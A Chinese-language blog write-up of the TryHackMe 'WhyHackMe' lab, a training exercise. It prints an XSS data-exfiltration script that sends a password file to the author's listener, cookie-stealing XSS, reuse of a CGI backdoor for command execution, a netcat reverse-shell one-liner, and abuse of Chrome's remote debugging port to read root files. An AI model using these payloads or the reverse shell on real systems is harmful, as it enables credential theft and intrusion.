---
title: THM WhyHackMe
published: 2025-06-02
pinned: false
description: THM WhyHackMe wp
tags: ['THM']
category: 渗透
licenseName: "MIT"
author: zsm
draft: false
date: 2025-06-02
pubDate: 2025-06-02
---


## 前言
THM的一个中等难度靶机，主要是xss相关？挺难的（

## 外网打点
nmap+dirsearch启动
```
 nmap -sC -sV 10.10.146.135     
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-06-02 15:53 CST
Nmap scan report for 10.10.146.135
Host is up (0.24s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 0        0             318 Mar 14  2023 update.txt
| ftp-syst:
|   STAT:
| FTP server status:
|      Connected to 10.21.155.141
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 3
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 47:71:2b:90:7d:89:b8:e9:b4:6a:76:c1:50:49:43:cf (RSA)
|   256 cb:29:97:dc:fd:85:d9:ea:f8:84:98:0b:66:10:5e:6f (ECDSA)
|_  256 12:3f:38:92:a7:ba:7f:da:a7:18:4f:0d:ff:56:c1:1f (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Welcome!!
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 56.16 seconds

 python dirsearch.py -u http://10.10.146.135            

  _|. _ _  _  _  _ _|_    v0.4.3
 (_||| _) (/_(_|| (_| )

Extensions: php, asp, aspx, jsp, html, htm | HTTP method: GET | Threads: 25 | Wordlist size: 12290

Target: http://10.10.146.135/

[15:57:12] Scanning:
[15:57:27] 403 -   278B - /.php
[15:58:04] 301 -   315B - /assets  ->  http://10.10.146.135/assets/
[15:58:04] 200 -    1KB - /assets/
[15:58:11] 403 -   278B - /cgi-bin/
[15:58:11] 403 -   278B - /cgi-bin/awstats.pl
[15:58:11] 403 -   278B - /cgi-bin/a1stats/a1disp.cgi
[15:58:11] 403 -   278B - /cgi-bin/awstats/
[15:58:11] 403 -   278B - /cgi-bin/htmlscript
[15:58:11] 403 -   278B - /cgi-bin/login
[15:58:11] 403 -   278B - /cgi-bin/login.php
[15:58:11] 403 -   278B - /cgi-bin/login.cgi
[15:58:11] 403 -   278B - /cgi-bin/mt-xmlrpc.cgi
[15:58:11] 403 -   278B - /cgi-bin/mt.cgi
[15:58:11] 403 -   278B - /cgi-bin/mt/mt-xmlrpc.cgi
[15:58:11] 403 -   278B - /cgi-bin/mt/mt.cgi
[15:58:11] 403 -   278B - /cgi-bin/mt7/mt-xmlrpc.cgi
[15:58:11] 403 -   278B - /cgi-bin/mt7/mt.cgi
[15:58:11] 403 -   278B - /cgi-bin/php.ini
[15:58:11] 403 -   278B - /cgi-bin/printenv.pl
[15:58:11] 403 -   278B - /cgi-bin/ViewLog.asp
[15:58:11] 403 -   278B - /cgi-bin/test-cgi
[15:58:11] 403 -   278B - /cgi-bin/test.cgi
[15:58:11] 403 -   278B - /cgi-bin/htimage.exe?2,2
[15:58:11] 403 -   278B - /cgi-bin/imagemap.exe?2,2
[15:58:11] 403 -   278B - /cgi-bin/index.html
[15:58:11] 403 -   278B - /cgi-bin/printenv
[15:58:15] 200 -     0B - /config.php
[15:58:22] 403 -   278B - /dir
[15:58:36] 200 -   563B - /index.php
[15:58:36] 200 -   563B - /index.php/login/
[15:58:42] 200 -   523B - /login.php
[15:58:43] 302 -     0B - /logout.php  ->  login.php
[15:59:02] 200 -   643B - /register.php
[15:59:06] 403 -   278B - /server-status/
[15:59:06] 403 -   278B - /server-status

Task Completed
```
这个时候缓一下，差点忘记`21ftp`没看，直接连接上去拿下来一个文件
```
cat update.txt   
Hey I just removed the old user mike because that account was compromised and for any of you who wants the creds of new account visit 127.0.0.1/dir/pass.txt and don't worry this file is only accessible by localhost(127.0.0.1), so nobody else can view it except me or people with access to the common account.
- admin
```
知道了用户名admin和common，还有一个路径`/dir/pass.txt`  
先访问一下网站，是个blog，最下面一行
```
Name: admin
Comment: Hey people, I will be monitoring your comments so please be safe and civil.
```
管理员说自己会检查评论，可能是xss弹cookie了，让我想起来了不好的回忆(ccb)。`/register.php`可以去注册用户，创建一个普通账户，尝试xss没有用。尝试一下用户名`<script>alert(1);</script>`，是有效果的，那么接下来要么拿到cookie，要么拿到敏感文件。  
还是先尝试拿cookie吧，毕竟是amdin
```
<script>fetch("http://10.21.155.141:9000",{method: "POST", body: document.cookie});</script>
```
bp去拦截评论发表，放包看本地回显，发现无回显，看来不太行，尝试拿文件吧，参考这个[文档](https://raw.githubusercontent.com/hoodoer/XSS-Data-Exfil/main/exfilPayload.js)以及这个[帖子](https://trustedsec.com/blog/simple-data-exfiltration-through-xss)
```nodejs
// TrustedSec Proof-of-Concept to steal
// sensitive data through XSS payload


function read_body(xhr)
{
	var data;

	if (!xhr.responseType || xhr.responseType === "text")
	{
		data = xhr.responseText;
	}
	else if (xhr.responseType === "document")
	{
		data = xhr.responseXML;
	}
	else if (xhr.responseType === "json")
	{
		data = xhr.responseJSON;
	}
	else
	{
		data = xhr.response;
	}
	return data;
}




function stealData()
{
	var uri = "/dir/pass.txt";

	xhr = new XMLHttpRequest();
	xhr.open("GET", uri, true);
	xhr.send(null);

	xhr.onreadystatechange = function()
	{
		if (xhr.readyState == XMLHttpRequest.DONE)
		{
			// We have the response back with the data
			var dataResponse = read_body(xhr);


			// Time to exfiltrate the HTML response with the data
			var exfilChunkSize = 2000;
			var exfilData      = btoa(dataResponse);
			var numFullChunks  = ((exfilData.length / exfilChunkSize) | 0);
			var remainderBits  = exfilData.length % exfilChunkSize;

			// Exfil the yummies
			for (i = 0; i < numFullChunks; i++)
			{
				console.log("Loop is: " + i);

				var exfilChunk = exfilData.slice(exfilChunkSize *i, exfilChunkSize * (i+1));

				// Let's use an external image load to get our data out
				// The file name we request will be the data we're exfiltrating
				var downloadImage = new Image();
				downloadImage.onload = function()
				{
					image.src = this.src;
				};

				// Try to async load the image, whose name is the string of data
				downloadImage.src = "http://10.21.155.141:9000/1/" + i + "/" + exfilChunk + ".jpg";
			}

			// Now grab that last bit
			var exfilChunk = exfilData.slice(exfilChunkSize * numFullChunks, (exfilChunkSize * numFullChunks) + remainderBits);
			var downloadImage = new Image();
			downloadImage.onload = function()
			{
    			image.src = this.src;
			};

			downloadImage.src = "http://10.21.155.141:9000/1/" + "LAST" + "/" + exfilChunk + ".jpg";
			console.log("Done exfiling chunks..");
		}
	}
}

stealData();
```
名字是`<script src=http://10.21.155.141:9000/1.js></script>`
拿到base64后的信息，厨子拿到`jack:WhyIsMyPasswordSoStrongIDK`
ssh上去
```
jack@ubuntu:~$ ls
user.txt
jack@ubuntu:~$ cat *
1ca4eb201787acbfcf9e70fca87b866a
```

## 提权
```
jack@ubuntu:~$ sudo -l
[sudo] password for jack:
Matching Defaults entries for jack on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jack may run the following commands on ubuntu:
    (ALL : ALL) /usr/sbin/iptables

jack@ubuntu:/opt$ ls -la
total 40
drwxr-xr-x  2 root root  4096 Aug 16  2023 .
drwxr-xr-x 19 root root  4096 Mar 14  2023 ..
-rw-r--r--  1 root root 27247 Aug 16  2023 capture.pcap
-rw-r--r--  1 root root   388 Aug 16  2023 urgent.txt
jack@ubuntu:/opt$ cat urgent.txt
Hey guys, after the hack some files have been placed in /usr/lib/cgi-bin/ and when I try to remove them, they wont, even though I am root. Please go through the pcap file in /opt and help me fix the server. And I temporarily blocked the attackers access to the backdoor by using iptables rules. The cleanup of the server is still incomplete I need to start by deleting these files first.
(GPT翻译：嘿，伙计们，遭到攻击之后，有一些文件被放到了 /usr/lib/cgi-bin/ 目录下，而且即使我是 root 用户，我也删不掉它们。请帮我分析一下 /opt 目录下的 pcap 文件，并帮我修复服务器。我目前已经用 iptables 规则暂时阻止了攻击者访问后门。但服务器的清理工作还没有完成，我需要先把这些文件删除掉。)
jack@ubuntu:/opt$ ls -la /usr/lib/
total 1144
drwxr-xr-x 91 root root     4096 Jan 29  2024 .
drwxr-xr-x 14 root root     4096 Aug 31  2022 ..
drwxr-xr-x  2 root root     4096 Jan 29  2024 accountsservice
drwxr-xr-x  3 root root     4096 Mar 14  2023 apache2
drwxr-xr-x  2 root root     4096 Aug 31  2022 apparmor
drwxr-xr-x  5 root root     4096 Aug 31  2022 apt
drwxr-xr-x  2 root root     4096 Mar 14  2023 bfd-plugins
drwxr-xr-x  2 root root     4096 Apr 22  2020 binfmt.d
drwxr-xr-x  3 root root     4096 Aug 31  2022 byobu
drwxr-x---  2 root h4ck3d   4096 Aug 16  2023 cgi-bin
```
可以看见这玩意已经被分配到`h4ck3d`了，还有个流量包，dump到本地，看鲨鱼启动
```
Listen 41312
<VirtualHost *:41312>
        ServerName www.example.com
        ServerAdmin webmaster@localhost
        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined
        SSLEngine on
        SSLCipherSuite AES256-SHA
        SSLProtocol -all +TLSv1.2
        SSLCertificateFile /etc/apache2/certs/apache-certificate.crt
        SSLCertificateKeyFile /etc/apache2/certs/apache.key
        ScriptAlias /cgi-bin/ /usr/lib/cgi-bin/
        AddHandler cgi-script .cgi .py .pl
        DocumentRoot /usr/lib/cgi-bin/
        <Directory "/usr/lib/cgi-bin">
                AllowOverride All 
                Options +ExecCGI -Multiviews +SymLinksIfOwnerMatch
                Order allow,deny
                Allow from all
        </Directory>
</VirtualHost>
```
看看`iptables` 的配置
```
jack@ubuntu:/opt$ sudo /usr/sbin/iptables -L --line-numbers
Chain INPUT (policy ACCEPT)
num  target     prot opt source               destination
1    DROP       tcp  --  anywhere             anywhere             tcp dpt:41312
2    ACCEPT     all  --  anywhere             anywhere
3    ACCEPT     all  --  anywhere             anywhere             ctstate NEW,RELATED,ESTABLISHED
4    ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:ssh
5    ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:http
6    ACCEPT     icmp --  anywhere             anywhere             icmp echo-request
7    ACCEPT     icmp --  anywhere             anywhere             icmp echo-reply
8    DROP       all  --  anywhere             anywhere

Chain FORWARD (policy ACCEPT)
num  target     prot opt source               destination

Chain OUTPUT (policy ACCEPT)
num  target     prot opt source               destination
1    ACCEPT     all  --  anywhere             anywhere
```
反正都是围绕着这个端口搞的，这个端口目前不能访问的，替换规则先
```
jack@ubuntu:/opt$ sudo /usr/sbin/iptables -R INPUT 1 -p tcp -m tcp --dport 41312 -j ACCEPT
jack@ubuntu:/opt$ sudo /usr/sbin/iptables -L --line-numbers
Chain INPUT (policy ACCEPT)
num  target     prot opt source               destination
1    ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:41312
2    ACCEPT     all  --  anywhere             anywhere
3    ACCEPT     all  --  anywhere             anywhere             ctstate NEW,RELATED,ESTABLISHED
4    ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:ssh
5    ACCEPT     tcp  --  anywhere             anywhere             tcp dpt:http
6    ACCEPT     icmp --  anywhere             anywhere             icmp echo-request
7    ACCEPT     icmp --  anywhere             anywhere             icmp echo-reply
8    DROP       all  --  anywhere             anywhere

Chain FORWARD (policy ACCEPT)
num  target     prot opt source               destination

Chain OUTPUT (policy ACCEPT)
num  target     prot opt source               destination
1    ACCEPT     all  --  anywhere             anywhere
```
然后访问这个端口，没有什么东西，还是HTTPS访问，估计是搞证书去解密流量包了  
流量相关看这个[帖子](https://my.f5.com/manage/s/article/K19310681)
我们已经知道 https 服务器使用` /etc/apache2/sites-enabled/000-default.conf` 中 `/etc/apache2/certs/apache.key` 中的密钥。
用户 jack 可以读取密钥。因此，下载密钥并通过 `Edit->Preferences->Protocols->TLS` 将其导入 Wireshark。
解密后，流量显示攻击者能够通过向 `/cgi-bin/5UP3r53Cr37.py` 发出请求来运行命令。用相同的命令去rce
```
curl -k -s 'https://10.10.146.135:41312/cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN&cmd=id' 
<h2>uid=33(www-data) gid=1003(h4ck3d) groups=1003(h4ck3d)
<h2>
```
弹shell
```
curl -k -s 'https://10.10.146.135:41312/cgi-bin/5UP3r53Cr37.py?key=48pfPHUrj4pmHzrC&iv=VZukhsCo8TlTXORN' --data-urlencode cmd='rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.21.155.141 4444 >/tmp/f'
```
成功拿到shell，看看
```
www-data@ubuntu:/usr/lib/cgi-bin$ sudo -l
sudo -l
Matching Defaults entries for www-data on ubuntu:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on ubuntu:
    (ALL : ALL) NOPASSWD: ALL
``` 
wc，顶级大黑客，全是root，gameover了

## 另一种root方法
看jaxafed佬的blog发现的  
首先穿个pspy上去，发现一个进程调用的是root，并且是由 pyppeteer 控制的 chrome 
```
2024/01/06 05:44:19 CMD: UID=0     PID=32385  | /root/.local/share/pyppeteer/local-chromium/588429/chrome-linux/chrome --disable-background-networking --disable-background-timer-throttling --disable-breakpad --disable-browser-side-navigation --disable-client-side-phishing-detection --disable-default-apps --disable-dev-shm-usage --disable-extensions --disable-features=site-per-process --disable-hang-monitor --disable-popup-blocking --disable-prompt-on-repost --disable-sync --disable-translate --metrics-recording-only --no-first-run --safebrowsing-disable-auto-update --enable-automation --password-store=basic --use-mock-keychain --headless --hide-scrollbars --mute-audio about:blank --no-sandbox --remote-debugging-port=46775 --user-data-dir=/root/.local/share/pyppeteer/.dev_profile/tmpk9ujyvwz 
```
此端口可用于控制浏览器和读取本地文件，方法是使浏览器导航到具有 file:// 协议的 URL，并告诉它发送页面内容.  
用的这个[方法](https://gist.github.com/pich4ya/5e7d3d172bb4c03360112fd270045e05)  
由于漏洞利用所需的所有 Python 包在目标上不可用，因此我将在我的计算机上运行该漏洞。但是 Chrome 端口正在侦听 127.0.0.1，因此需要从外部访问它。  
Chrome 进程每次都使用不同的调试端口运行，并且运行时间非常短。因此，我不会在看到进程后尝试转发端口，而是使用 ssh 建立一个 socks 代理。  
修改 `/etc/proxychains4.conf` 以便能够将 `socks` 代理与 `proxychains` 一起使用。
```
...
# defaults set to "tor"
#socks4     127.0.0.1 9050
socks5 127.0.0.1 1080
```
然后再修改一点东西
+ 将 victim 更改为 127.0.0.1。
+ 可以将目标端口作为命令行参数传递。
+ 将 url 从 file:///etc/passwd 更改为 file:///root/root.txt。  
现在，当我看到 Chrome 下次运行时，我将使用代理链和 --remote-debugging-port 参数中指定的端口来运行漏洞利用。多运行几次就可以拿到了
```
$ proxychains -q ./chrome_remote_debug_lfi.py 44523
ws://127.0.0.1:44523/devtools/page/3FC55BCC759CB7D158BDB700C2E84ADE
{"id":3592,"result":{"frameId":"3FC55BCC759CB7D158BDB700C2E84ADE","loaderId":"B35E879C2B29484750665A8B1EF9A15A"}}
{"id":3593,"result":{"result":{"type":"string","value":"<html><head></head><body><pre style=\"word-wrap: break-word; white-space: pre-wrap;\">[REDACTED]\n</pre></body></html>"}}}
```
## 总结
看鲨鱼是真的不会啊xd，得补补知识了。还有xss的算是新方法吧对我来说，看别人的wp去复现两三遍也是有用的